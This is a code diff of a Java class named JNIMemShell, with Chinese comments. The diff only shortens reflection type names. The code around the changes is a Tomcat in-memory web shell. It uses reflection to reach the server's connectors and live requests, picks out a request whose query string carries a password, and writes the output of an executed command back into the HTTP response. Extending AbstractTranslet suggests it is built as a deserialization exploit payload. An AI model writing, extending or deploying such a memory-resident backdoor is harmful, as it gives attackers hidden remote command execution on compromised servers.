@@ -54,14 +54,14 @@ public class JNIMemShell extends AbstractTranslet{
             Context StandardContext =  resources.getContext();
 
             //获取ApplicationContext
-            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
+            Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
             contextField.setAccessible(true);
-            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(StandardContext);
+            ApplicationContext applicationContext = (ApplicationContext) contextField.get(StandardContext);
 
             //获取StandardService
-            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
+            Field serviceField = ApplicationContext.class.getDeclaredField("service");
             serviceField.setAccessible(true);
-            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);
+            StandardService standardService = (StandardService) serviceField.get(applicationContext);
 
             //获取Connector
             org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();
@@ -71,24 +71,24 @@ public class JNIMemShell extends AbstractTranslet{
                 if (connectors[i].getScheme().contains("http")) {
                     //获取protocolHandler、connectionHandler
                     org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
-                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler", null);
+                    Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler", null);
                     getHandlerMethod.setAccessible(true);
                     org.apache.tomcat.util.net.AbstractEndpoint.Handler connectionHandler = (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler, null);
 
                     //获取RequestGroupInfo
-                    java.lang.reflect.Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
+                    Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
                     globalField.setAccessible(true);
                     org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectionHandler);
 
                     //获取RequestGroupInfo中储存了RequestInfo的processors
-                    java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
+                    Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                     processorsField.setAccessible(true);
                     java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
                     for (int k = 0; k < list.size(); k++) {
                         org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) list.get(k);
                         if (requestInfo.getCurrentQueryString().contains(pass)) {
                             //获取request
-                            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
+                            Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
                             requestField.setAccessible(true);
                             org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);
                             org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
@@ -100,7 +100,7 @@ public class JNIMemShell extends AbstractTranslet{
                                 String output = s.hasNext() ? s.next() : "";
                                 //回显
                                 java.io.Writer writer = request.getResponse().getWriter();
-                                java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField("usingWriter");
+                                Field usingWriter = request.getResponse().getClass().getDeclaredField("usingWriter");
                                 usingWriter.setAccessible(true);
                                 usingWriter.set(request.getResponse(), Boolean.FALSE);
                                 writer.write(output);
